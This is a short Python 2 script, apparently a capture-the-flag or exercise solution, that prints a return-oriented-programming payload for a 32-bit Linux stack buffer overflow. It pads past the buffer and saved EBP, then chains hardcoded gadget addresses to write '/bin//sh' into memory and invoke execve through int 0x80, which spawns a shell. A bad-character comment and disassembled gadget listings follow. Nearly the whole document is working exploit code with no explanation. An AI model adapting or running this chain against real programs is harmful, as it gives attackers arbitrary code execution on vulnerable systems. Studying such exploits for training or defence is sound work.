from struct import pack

junk = "SAIF"
buf = 'A'*108
ebp = 'B'*4

popeaxret = pack("<I", 0x080c2356)
popebxret = pack("<I", 0x080481ec)
popecxret = pack("<I", 0x080e3d46)
popedxret = pack("<I", 0x805733a)
moveaxecxret = pack("<I", 0x0806f44a)
xoreaxeaxret = pack("<I", 0x8051750)
inceaxret = pack("<I", 0x8050bbc)
int80ret = pack("<I", 0x8057ae0)

data_addr1 = pack("<I", 0x80ef060)
data_addr2 = pack("<I", 0x080ef064)
null_addr = pack("<I", 0x80ef068)

shell1 = "/bin"
shell2 = "//sh"


print buf+ebp+popeaxret+shell1+popecxret+data_addr1+moveaxecxret+popeaxret+shell2+popecxret+data_addr2+moveaxecxret+xoreaxeaxret+popecxret+null_addr+moveaxecxret+popecxret+null_addr+popedxret+null_addr+popebxret+data_addr1+xoreaxeaxret+(inceaxret+junk)*11+int80ret

#address cannot contain whitespace 20, /n 2F6E, /t 2F74, /0 2F30

'''
 805733a:	5a                   	pop    %edx
 805733b:	c3                   	ret    

 806f44a:	89 01                	mov    %eax,(%ecx)
 806f44c:	c3                   	ret   

 808e830:	8b 01                	mov    (%ecx),%eax
 808e832:	5b                   	pop    %ebx
 808e833:	5e                   	pop    %esi
'''
